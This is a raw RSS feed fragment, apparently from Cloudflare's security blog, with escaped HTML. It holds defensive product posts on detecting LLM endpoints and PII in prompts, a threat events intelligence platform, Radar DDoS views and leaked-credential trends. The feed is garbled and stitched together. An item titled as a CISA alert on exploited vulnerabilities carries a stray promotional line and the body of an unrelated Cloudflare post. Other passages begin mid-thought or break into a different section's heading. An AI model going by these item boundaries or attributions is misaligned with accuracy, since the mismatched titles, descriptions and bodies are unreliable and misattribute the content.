coverage further, but does not yet cover the &lt;a href="https://stackoverflow.blog/2022/06/02/a-beginners-guide-to-json-the-data-format-for-the-internet/"&gt;&lt;u&gt;majority of applications&lt;/u&gt;&lt;/a&gt; that are using JSON format for data exchanges. Continuing the journey, our next focus is on the responses having header content type of &lt;code&gt;application/json&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;No matter how fast LLMs can be optimized to respond, when chatting with major LLMs, we often perceive them to be slow, as we have to wait for them to “think”. By plotting on how much time it takes for the origin server to respond over identified LLM endpoints (blue line) versus the rest (orange line), we can see in the left graph that origins serving LLM endpoints mostly need more than 1 second to respond, while the majority of the rest takes less than 1 second. Would we also see a clear distinction between origin server response body sizes, where the majority of LLM endpoints would respond with smaller sizes because major LLM providers &lt;a href="https://platform.openai.com/docs/guides/safety-best-practices#constrain-user-input-and-limit-output-tokens"&gt;&lt;u&gt;limit output tokens&lt;/u&gt;&lt;/a&gt;? Unfortunately not. The right graph shows that LLM response size largely overlaps with non-LLM traffic.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4CkowlKelGlYueNzSrbsGn/f8091d66a6c0eb8b884c7cc6f2a128ab/1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;By dividing origin response size over origin response duration to calculate an effective bitrate, the distinction is even clearer that 80% of LLM endpoints operate slower than 4 KB/s.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5sJKUnLmWwnTWzUOyWVRKO/c98c8fc32dbafa5d79f21effdfc58f34/2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Validating this assumption by using bitrate as a heuristic across Cloudflare’s traffic, we found that roughly 3% of all origin server responses have a bitrate lower than 4 KB/s. Are these responses all powered by LLMs? Our gut feeling tells us that it is unlikely that 3% of origin responses are LLM-powered! &lt;/p&gt;&lt;p&gt;Among the paths found in the 3% of matching responses, there are few patterns that stand out: 1) GraphQL endpoints, 2) device heartbeat or health check, 3) generators (for QR codes, one time passwords, invoices, etc.). Noticing this gave us the idea to filter out endpoints that have a low variance of response size over time — for instance, invoice generation is mostly based on the same template, while conversations in the LLM context have a higher variance.&lt;/p&gt;&lt;p&gt;A combination of filtering out known false positive patterns and low variance in response size gives us a satisfying result. These matching endpoints, approximately 30,000 of them, labelled &lt;code&gt;cf-llm&lt;/code&gt;, can now be found in API Shield or Web assets, depending on your dashboard’s version, for all customers. Now you can review your endpoints and decide how to best protect them.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Detecting prompts designed to leak PII&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#detecting-prompts-designed-to-leak-pii"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are multiple methods to detect PII in LLM prompts. A common method relies on &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions"&gt;&lt;u&gt;regular expressions (“regexes”)&lt;/u&gt;&lt;/a&gt;, which is a method we have been using in the WAF for &lt;a href="https://developers.cloudflare.com/waf/managed-rules/reference/sensitive-data-detection/"&gt;&lt;u&gt;Sensitive Data Detection&lt;/u&gt;&lt;/a&gt; on the body of the HTTP response from the web server Regexes offer low latency, easy customization, and straightforward implementation. However, regexes alone have limitations when applied to LLM prompts. They require frequent updates to maintain accuracy, and may struggle with more complex or implicit PII, where the information is spread across text rather than a fixed format. &lt;/p&gt;&lt;p&gt;For example, regexes work well for structured data like credit card numbers and addresses, but struggle with PII is embedded in natural language. For instance, “I just booked a flight using my Chase card, ending in 1111” wouldn’t trigger a regex match as it lacks the expected pattern, even though it reveals a partial credit card number and financial institution.&lt;/p&gt;&lt;p&gt;To enhance detection, we rely on a &lt;a href="https://www.ibm.com/think/topics/named-entity-recognition"&gt;&lt;u&gt;Named Entity Recognition (NER)&lt;/u&gt;&lt;/a&gt; model, which adds a layer of intelligence to complement regex-based detection. NER models analyze text to identify contextual PII data types, such as names, phone numbers, email addresses, and credit card numbers, making detection more flexible and accurate. Cloudflare’s detection utilizes &lt;a href="https://microsoft.github.io/presidio/"&gt;&lt;u&gt;Presidio&lt;/u&gt;&lt;/a&gt;, an open-source PII detection framework, to further strengthen this approach.&lt;/p&gt;&lt;h4&gt;Using Workers AI to deploy Presidio&lt;/h4&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5ruqPkxJBgFCRdsoft1TO1/aa327b069569a0f952c8baea102955b8/3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In our design, we leverage Cloudflare &lt;a href="https://developers.cloudflare.com/workers-ai/"&gt;&lt;u&gt;Workers AI&lt;/u&gt;&lt;/a&gt; as the fastest way to deploy &lt;a href="https://microsoft.github.io/presidio/"&gt;&lt;u&gt;Presidio&lt;/u&gt;&lt;/a&gt;. This integration allows us to process LLM app requests inline, ensuring that sensitive data is flagged before it reaches the model.&lt;/p&gt;&lt;p&gt;Here’s how it works:&lt;/p&gt;&lt;p&gt;When Firewall for AI is enabled on an application and an end user sends a request to an LLM-powered application, we pass the request to Cloudflare Workers AI which runs the request through Presidio’s NER-based detection model to identify any potential PII from the available &lt;a href="https://microsoft.github.io/presidio/supported_entities/"&gt;&lt;u&gt;entities&lt;/u&gt;&lt;/a&gt;. The output includes metadata like “Was PII found?” and “What type of PII entity?”. This output is then processed in our Firewall for AI module, and handed over to other systems, like &lt;a href="https://developers.cloudflare.com/waf/analytics/security-analytics/"&gt;&lt;u&gt;Security Analytics&lt;/u&gt;&lt;/a&gt; for visibility, and the rules like &lt;a href="https://developers.cloudflare.com/waf/custom-rules/"&gt;&lt;u&gt;Custom rules&lt;/u&gt;&lt;/a&gt; for enforcement. Custom rules allow customers to take appropriate actions on the requests based on the provided metadata. &lt;/p&gt;&lt;p&gt;If no terminating action, like blocking, is triggered, the request proceeds to the LLM. Otherwise, it gets blocked or the appropriate action is applied before reaching the origin.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Integrating AI security into the WAF and Analytics&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#integrating-ai-security-into-the-waf-and-analytics"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Securing AI interactions shouldn't require complex integrations. Firewall for AI is seamlessly built into Cloudflare’s WAF, allowing customers to enforce security policies before prompts reach LLM endpoints. With this integration, there are &lt;a href="https://developers.cloudflare.com/waf/detections/firewall-for-ai/#fields"&gt;&lt;u&gt;new fields available&lt;/u&gt;&lt;/a&gt; in Custom and Rate limiting rules. The rules can be used to take immediate action, such as blocking or logging risky prompts in real time.&lt;/p&gt;&lt;p&gt;For example, security teams can filter LLM traffic to analyze requests containing PII-related prompts. Using Cloudflare’s WAF rules engine, they can create custom security policies tailored to their AI applications.&lt;/p&gt;&lt;p&gt;Here’s what a rule to block detected PII prompts looks like:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4cvlFU0sia6dZly2LZGG8l/670dbb1ad5068f0fd5d8f4afde9e9e02/4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Alternatively, if an organization wants to allow certain PII categories, such as location data, they can create an exception rule:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/wYFkoQyHFoFNwHmKtaaG3/94c7ae78dbabacf5dd8583af9e8eb071/5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition to the rules, users can gain visibility into LLM interactions, detect potential risks, and enforce security controls using &lt;a href="https://developers.cloudflare.com/waf/analytics/security-analytics/"&gt;&lt;u&gt;Security Analytics&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/waf/analytics/security-events/"&gt;&lt;u&gt;Security Events&lt;/u&gt;&lt;/a&gt;. You can find more details in our &lt;a href="https://developers.cloudflare.com/waf/detections/firewall-for-ai/"&gt;&lt;u&gt;documentation&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What's next: token counting, guardrails, and beyond&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next-token-counting-guardrails-and-beyond"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Beyond PII detection and creating security rules, we’re developing additional capabilities to strengthen AI security for our customers. The next feature we’ll release is token counting, which analyzes prompt structure and length. Customers can use the token count field in Rate Limiting and WAF Custom rules to prevent their users from sending very long prompts, which can impact third party model bills, or allow users to abuse the models. This will be followed by using AI to detect and allow content moderation, which will provide more flexibility in building guardrails in the rules.&lt;/p&gt;&lt;p&gt;If you're an enterprise customer, join the Firewall for AI beta today! Contact your customer team to start monitoring traffic, building protection rules, and taking control of your LLM traffic.&lt;/p&gt;</content:encoded><guid isPermaLink="false">5XoyHPSrtBH8pPvUJkOXMD</guid><category>Security Week</category><category>Security</category><category>LLM</category><category>Web Asset Discovery</category></item><item><title>CISA Adds Three Known Exploited Vulnerabilities to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/03/19/cisa-adds-three-known-exploited-vulnerabilities-catalog</link><description>&lt;p&gt;CISA has added three new vulnerabilities to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;

This tool empowers your cybersecurity defense with actionable intelligence to stay ahead of attacks and protect your critical assets.</description><content:encoded>&lt;p&gt;Today, one of the greatest challenges that cyber defenders face is analyzing detection hits from indicator feeds, which provide metadata about specific indicators of compromise (IOCs), like IP addresses, &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;ASNs&lt;/u&gt;&lt;/a&gt;, domains, URLs, and hashes. While indicator feeds have proliferated across the threat intelligence industry, most feeds contain no contextual information about why an indicator was placed on the feed. Another limitation of most feeds today is that they focus solely on blockable indicators and cannot easily accommodate more complex cases, such as a threat actor exploiting a CVE or an insider threat. Instead, this sort of complex threat intelligence is left for long form reporting. However, long-form reporting comes with its own challenges, such as the time required for writing and editing, which can lead to significant delays in releasing timely threat intelligence.&lt;/p&gt;&lt;p&gt;To help address these challenges, we are excited to launch our &lt;a href="https://developers.cloudflare.com/security-center/cloudforce-one/#analyze-threat-events"&gt;&lt;u&gt;threat events platform&lt;/u&gt;&lt;/a&gt; for Cloudforce One customers. Every day, Cloudflare blocks billions of cyber threats. This new platform contains contextual data about the threats we monitor and mitigate on the Cloudflare network and is designed to empower security practitioners and decision makers with actionable insights from a global perspective. &lt;/p&gt;&lt;p&gt;On average, we process 71 million HTTP requests per second and 44 million DNS queries per second. This volume of traffic provides us with valuable insights and a comprehensive view of current (real-time) threats. The new threat events platform leverages the insights from this traffic to offer a comprehensive, real-time view of threat activity occurring on the Internet, enabling &lt;a href="https://www.cloudflare.com/application-services/products/cloudforceone/"&gt;&lt;u&gt;Cloudforce One&lt;/u&gt;&lt;/a&gt; customers to better protect their assets and respond to emerging threats.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How we built the threat events platform leveraging Cloudflare’s traffic insights&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-we-built-the-threat-events-platform-leveraging-cloudflares-traffic-insights"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The sheer volume of threat activity observed across Cloudflare’s network would overwhelm any system or SOC analyst. So instead, we curate this activity into a stream of events that include not only indicators of compromise (IOCs) but also context, making it easier to take action based on Cloudflare’s unique data. To start off, we expose events related to &lt;a href="https://www.cloudflare.com/en-gb/ddos/"&gt;&lt;u&gt;denial of service&lt;/u&gt;&lt;/a&gt; (DOS) attacks observed across our network, along with the advanced threat operations tracked by our &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/cloudforceone/"&gt;&lt;u&gt;Cloudforce One Intelligence team&lt;/u&gt;&lt;/a&gt;, like the various tools, techniques, and procedures used by the threat actors we are tracking. We mapped the events to the &lt;a href="https://attack.mitre.org/"&gt;&lt;u&gt;MITRE ATT&amp;amp;CK&lt;/u&gt;&lt;/a&gt; framework and to the &lt;a href="https://en.wikipedia.org/wiki/Cyber_kill_chain"&gt;&lt;u&gt;cyber kill chain&lt;/u&gt;&lt;/a&gt; stages. In the future, we will add events related to traffic blocked by our &lt;a href="https://www.cloudflare.com/application-services/products/waf/"&gt;&lt;u&gt;Web Application Firewall&lt;/u&gt;&lt;/a&gt; (WAF), Zero Trust &lt;a href="https://www.cloudflare.com/zero-trust/products/gateway/"&gt;&lt;u&gt;Gateway&lt;/u&gt;&lt;/a&gt;, Zero Trust &lt;a href="https://www.cloudflare.com/zero-trust/products/email-security/"&gt;&lt;u&gt;Email Security&lt;/u&gt;&lt;/a&gt; Business Email Compromise, and many other Cloudflare-proprietary datasets. Together, these events will provide our customers with a detailed view of threat activity occurring across the Internet.&lt;/p&gt;&lt;p&gt;Each event in our threat events summarizes specific threat activity we have observed, similar to a &lt;a href="https://oasis-open.github.io/cti-documentation/stix/walkthrough#-sighting-object"&gt;&lt;u&gt;STIX2 sighting object&lt;/u&gt;&lt;/a&gt; and provides contextual information in its summary, detailed view and via the mapping to the MITRE ATT&amp;amp;Ck and KillChain stages. For an example entry, please see the &lt;a href="https://developers.cloudflare.com/api/resources/cloudforce_one/subresources/threat_events/"&gt;&lt;u&gt;API documentation&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7GIiqbsRaSXG6G9RIeHPdQ/fe42f8c5134208b97fc2f16f33c4ee9a/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Our goal is to empower customers to better understand the threat landscape by providing key information that allows them to investigate and address both broad and specific questions about threats targeting their organization. For example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Who is targeting my industry vertical?&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Who is targeting my country?&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;What indicators can I use to block attacks targeting my verticals?&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;What has an adversary done across the kill chain over some period of time?&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Each event has a unique identifier that links it to the identified threat activity, enabling our Cloudforce One threat intelligence analysts to provide additional context in follow-on investigations.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How we built the threat events platform using Cloudflare Workers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-we-built-the-threat-events-platform-using-cloudflare-workers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We chose to use the &lt;a href="https://www.cloudflare.com/developer-platform/products/"&gt;&lt;u&gt;Cloudflare Developer Platform&lt;/u&gt;&lt;/a&gt; to build out the threat events platform, as it allowed us to leverage the versatility and seamless integration of Cloudflare Workers. At its core, the platform is a Cloudflare Worker that uses &lt;a href="https://blog.cloudflare.com/sqlite-in-durable-objects/"&gt;&lt;u&gt;SQLite-backed Durable Objects&lt;/u&gt;&lt;/a&gt; to store events observed on the Cloudflare network. We opted to use Durable Objects over &lt;a href="https://developers.cloudflare.com/d1/"&gt;&lt;u&gt;D1&lt;/u&gt;&lt;/a&gt;, Cloudflare’s serverless SQL database solution, because it permits us to dynamically create SQL tables to store uniquely customizable datasets. Storing datasets this way allows threat events to scale across our network, so we are resilient to surges in data that might correlate with the unpredictable nature of attacks on the Internet. It also permits us to control events by data source, share a subset of datasets with trusted partners, or restrict access to only authorized users.  Lastly, the metadata for each individual threat event is stored in the Durable Object KV so that we may store contextual data beyond our fixed, searchable fields. This data may be in the form of requests-per-second for our denial of service events, or sourcing information so Cloudforce One analysts can tie the event to the exact threat activity for further investigation.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/P2fP5IBVHYCcytcT3xI3m/f0833512bb5d12b41f350847c368e92a/image5.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;How to use threat events&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-to-use-threat-events"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudforce One customers can access threat events through the Cloudflare Dashboard in &lt;a href="https://developers.cloudflare.com/security-center/"&gt;&lt;u&gt;Security Center&lt;/u&gt;&lt;/a&gt; or via the &lt;a href="https://developers.cloudflare.com/api/resources/cloudforce_one/subresources/threat-events/"&gt;&lt;u&gt;Cloudforce One threat events API&lt;/u&gt;&lt;/a&gt;. Each exposes the stream of threat activity occurring across the Internet as seen by Cloudflare, and are customizable by user-defined filters. &lt;/p&gt;&lt;p&gt;In the Cloudflare Dashboard, users have access to an Attacker Timelapse view, designed to answer strategic questions, as well as a more granular events table for drilling down into attack details. This approach ensures that users have the most relevant information at their fingertips.&lt;/p&gt;&lt;h4&gt;Events Table&lt;/h4&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2QiogugKXB8rGKMZ4cYaSK/506b56c7788648456f085e9fd04d975b/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;i&gt;&lt;/i&gt;&lt;a href="https://developers.cloudflare.com/security-center/cloudforce-one/#analyze-threat-events"&gt;&lt;u&gt;The events table&lt;/u&gt;&lt;/a&gt; is a detailed view in the Security Center where users can drill down into specific threat activity filtered by various criteria. It is here that users can explore specific threat events and adversary campaigns using Cloudflare’s traffic insights. Most importantly, this table will provide our users with actionable Indicators of Compromise and an event summary so that they can properly defend their services. All of the data available in our events table is equally accessible via the &lt;a href="https://developers.cloudflare.com/security-center/cloudforce-one/#analyze-threat-events"&gt;&lt;u&gt;Cloudforce One threat events API&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;To showcase the power of threat events, let’s explore a real-world case:&lt;/p&gt;&lt;p&gt;Recently leaked chats of the &lt;a href="https://therecord.media/black-basta-ransomware-group-chat-logs-leaked"&gt;&lt;u&gt;Black Basta&lt;/u&gt;&lt;/a&gt; criminal enterprise exposed details about their victims, methods, and infrastructure purchases. Although we can’t confirm whether the leaked chats were manipulated in any way, the infrastructure discussed in the chats was simple to verify. As a result, this threat intelligence is now available as events in the threat events, along with additional unique Cloudflare context. &lt;/p&gt;&lt;p&gt;Analysts searching for domains, hosts, and file samples used by Black Basta can leverage the threat events to gain valuable insight into this threat actor’s operations. For example, in the threat events UI, a user can filter the “Attacker” column by selecting ‘BlackBasta’ in the dropdown, as shown in the image below. This provides a curated list of verified IP addresses, domains, and file hashes for further investigation. For more detailed information on Cloudflare’s unique visibility into Black Basta threat activity see &lt;a href="https://www.cloudflare.com/threat-intelligence/research/report/black-bastas-blunder-exploiting-the-gangs-leaked-chats/"&gt;&lt;u&gt;Black Basta’s blunder: exploiting the gang’s leaked chats&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3z9ZtL3n2Ssu1iqPxDF8Fg/4283854ab4cc643b6acb71eb837c944d/image4.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Why we are publishing threat events&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-we-are-publishing-threat-events"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Our customers face a myriad of cyber threats that can disrupt operations and compromise sensitive data. As adversaries become increasingly sophisticated, the need for timely and relevant threat intelligence has never been more critical. This is why we are introducing threat events, which provides deeper insights into these threats. &lt;/p&gt;&lt;p&gt;The threat events platform aims to fill this gap by offering a more detailed and contextualized view of ongoing threat activity. This feature allows analysts to self-serve and explore incidents through customizable filters, enabling them to identify patterns and respond effectively. By providing access to real-time threat data, we empower organizations to make informed decisions about their security strategies.&lt;/p&gt;&lt;p&gt;To validate the value of our threat events platform, we had a Fortune 20 threat intelligence team put it to the test. They conducted an analysis against 110 other sources, and we ranked as their #1 threat intelligence source. They found us "very much a unicorn" in the threat intelligence space. It’s early days, but the initial feedback confirms that our intelligence is not only unique but also delivering exceptional value to defenders.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s next&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;While Cloudforce One customers now have access to our &lt;a href="https://developers.cloudflare.com/api/resources/cloudforce_one/subresources/threat-events/"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://dash.cloudflare.com/"&gt;&lt;u&gt;dashboard&lt;/u&gt;&lt;/a&gt;, allowing for seamless integration of threat intelligence into their existing systems, they will also soon have access to more visualisations and analytics for the threat events in order to better understand and report back on their findings. This upcoming UI will include enhanced visualizations of attacker timelines, campaign overviews, and attack graphs, providing even deeper insights into the threats facing your organization. Moreover, we’ll add the ability to integrate with existing SIEM platforms and share indicators across systems.&lt;/p&gt;&lt;p&gt;Read more about the &lt;a href="https://www.cloudflare.com/en-gb/threat-intelligence/"&gt;&lt;u&gt;threat intelligence research&lt;/u&gt;&lt;/a&gt; our team publishes here or reach out to your account team about how to leverage our new threat events to enhance your cybersecurity posture. &lt;/p&gt;

To that end, during 2023’s Security Week, we &lt;a href="https://blog.cloudflare.com/radar-url-scanner-early-access/"&gt;&lt;u&gt;launched our URL Scanner&lt;/u&gt;&lt;/a&gt;, which enables users to safely scan any URL to determine if it is safe to view or interact with. During 2024’s Security Week, we &lt;a href="https://blog.cloudflare.com/email-security-insights-on-cloudflare-radar/"&gt;&lt;u&gt;launched an Email Security page&lt;/u&gt;&lt;/a&gt;, which provides a unique perspective on the threats posed by malicious emails, spam volume, the adoption of &lt;a href="https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/"&gt;&lt;u&gt;email authentication methods like SPF, DMARC, and DKIM&lt;/u&gt;&lt;/a&gt;, and the use of IPv4/IPv6 and TLS by email servers. For Security Week 2025, we are adding several new DDoS-focused graphs, new insights into leaked credential trends, and a new &lt;b&gt;Bots&lt;/b&gt; page to Cloudflare Radar.  We are also taking this opportunity to refactor Radar’s &lt;b&gt;Security &amp;amp; Attacks&lt;/b&gt; page, breaking it out into &lt;b&gt;Application Layer&lt;/b&gt; and &lt;b&gt;Network Layer&lt;/b&gt; sections.&lt;/p&gt;&lt;p&gt;Below, we review all of these changes and additions to Radar.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Layered security&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#layered-security"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Since Cloudflare Radar launched in 2020, it has included both network layer (Layers 3 &amp;amp; 4) and application layer (Layer 7) attack traffic insights on a single &lt;b&gt;Security &amp;amp; Attacks&lt;/b&gt; page. Over the last four-plus years, we have evolved some of the existing data sets on the page, as well as adding new ones. As the page has grown and improved over time, it risked becoming unwieldy to navigate, making it hard to find the graphs and data of interest. To help address that, the &lt;b&gt;Security&lt;/b&gt; section on Radar now features separate &lt;a href="https://radar.cloudflare.com/security/application-layer"&gt;&lt;b&gt;&lt;u&gt;Application Layer&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; and &lt;a href="https://radar.cloudflare.com/security/network-layer"&gt;&lt;b&gt;&lt;u&gt;Network Layer&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; pages. The &lt;b&gt;Application Layer&lt;/b&gt; page is the default, and includes insights from analysis of HTTP-based malicious and attack traffic. The &lt;b&gt;Network Layer&lt;/b&gt; page includes insights from analysis of network and transport layer attacks, as well as observed &lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt;&lt;u&gt;TCP resets and timeouts&lt;/u&gt;&lt;/a&gt;. Future security and attack-related data sets will be added to the relevant page. &lt;a href="https://radar.cloudflare.com/email-security"&gt;&lt;b&gt;&lt;u&gt;Email Security&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; remains on its own dedicated page.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3zxFA8iG7N9MZQzAQAaCNf/ee92891b74b0d70052cc43239dad656f/image__2_.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;A geographic and network view of application layer DDoS attacks&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-geographic-and-network-view-of-application-layer-ddos-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Radar’s &lt;a href="https://radar.cloudflare.com/reports"&gt;&lt;u&gt;quarterly DDoS threat reports&lt;/u&gt;&lt;/a&gt; have historically provided insights, aggregated on a quarterly basis, into the top source and target locations of application layer DDoS attacks. A &lt;a href="https://radar.cloudflare.com/security/application-layer#application-layer-ddos-attacks-distribution"&gt;&lt;u&gt;new map and table&lt;/u&gt;&lt;/a&gt; on Radar’s &lt;b&gt;Application Layer&lt;/b&gt; Security page now provide more timely insights, with a global choropleth map showing a geographical distribution of source and target locations, and an accompanying list of the top 20 locations by share of all DDoS requests. Source location attribution continues to rely on the geolocation of the IP address originating the blocked request, while target location remains the billing location of the account that owns the site being attacked. &lt;/p&gt;&lt;p&gt;Over the first week of March 2025, the United States, Indonesia, and Germany were the top sources of &lt;a href="https://www.cloudflare.com/learning/ddos/application-layer-ddos-attack/"&gt;application layer DDoS attacks&lt;/a&gt;, together accounting for over 30% of such attacks as shown below. The concentration across the top targeted locations was quite different, with customers from Canada, the United States, and Singapore attracting 56% of application layer DDoS attacks.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7nW8CyC5L4s68ntQEe1pfT/a8b571b9b2325f5f71936367e8879af1/image10.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition to extended visibility into the geographic source of application layer DDoS attacks, we have also added &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system (AS)&lt;/u&gt;&lt;/a&gt;-level visibility. A &lt;a href="https://radar.cloudflare.com/security/application-layer#application-layer-ddos-attacks-source-as-distribution"&gt;&lt;u&gt;new treemap&lt;/u&gt;&lt;/a&gt; view shows the distribution of these attacks by source AS. At a global level, the largest sources include cloud/hosting providers in Germany, the United States, China, and Vietnam.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/332A6OGGKUNCE0wLVBKBmd/2b93c6bd46105602214d7ced2ead71b6/image7.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;For a selected country/region, the treemap displays a source AS distribution for attacks observed to be originating from that location. In some, the sources of attack traffic are heavily concentrated in consumer/business network providers, such as in &lt;a href="https://radar.cloudflare.com/security/application-layer/pt#application-layer-ddos-attacks-source-as-distribution"&gt;&lt;u&gt;Portugal&lt;/u&gt;&lt;/a&gt;, shown below. However, in other countries/regions that have a large cloud provider presence, such as &lt;a href="https://radar.cloudflare.com/security/application-layer/ie#application-layer-ddos-attacks-source-as-distribution"&gt;&lt;u&gt;Ireland&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/security/application-layer/sg#application-layer-ddos-attacks-source-as-distribution"&gt;&lt;u&gt;Singapore&lt;/u&gt;&lt;/a&gt;, and the &lt;a href="https://radar.cloudflare.com/security/application-layer/us#application-layer-ddos-attacks-source-as-distribution"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt;, ASNs associated with these types of providers are the dominant sources. To that end, Singapore was listed as being among the top sources of application layer DDoS attacks in each of the quarterly DDoS threat reports in 2024. &lt;/p&gt;
          &lt;figure&gt;

            &lt;h3&gt;Have you been pwned?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#have-you-been-pwned"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Every week, it seems like there’s another headline about a &lt;a href="https://www.cloudflare.com/learning/security/what-is-a-data-breach/"&gt;data breach&lt;/a&gt;, talking about thousands or millions of usernames and passwords being stolen. Or maybe you get an email from an identity monitoring service that your username and password were found on the “dark web”. (Of course, you’re getting those alerts thanks to a complementary subscription to the service offered as penance from another data breach…)&lt;/p&gt;&lt;p&gt;This credential theft is especially problematic because people often reuse passwords, despite best practices advising the use of strong, unique passwords for each site or application. To help mitigate this risk, &lt;a href="https://blog.cloudflare.com/a-safer-internet-with-cloudflare/#account-takeover-detection"&gt;&lt;u&gt;starting in 2024&lt;/u&gt;&lt;/a&gt;, Cloudflare began enabling customers to scan authentication requests for their websites and applications using a &lt;a href="https://blog.cloudflare.com/privacy-preserving-compromised-credential-checking/"&gt;&lt;u&gt;privacy-preserving&lt;/u&gt;&lt;/a&gt; compromised credential checker implementation to detect known-leaked usernames and passwords. Today, we're using aggregated data to display trends in how often these leaked and stolen credentials are observed across Cloudflare's network. (Here, we are defining “leaked credentials” as usernames or passwords being found in a public dataset, or the username and password detected as being similar.)&lt;/p&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/waf/detections/leaked-credentials/#how-it-works"&gt;&lt;u&gt;Leaked credentials detection&lt;/u&gt;&lt;/a&gt; scans incoming HTTP requests for known authentication patterns from common web apps and any custom detection locations that were configured. The service uses a privacy-preserving compromised credential checking 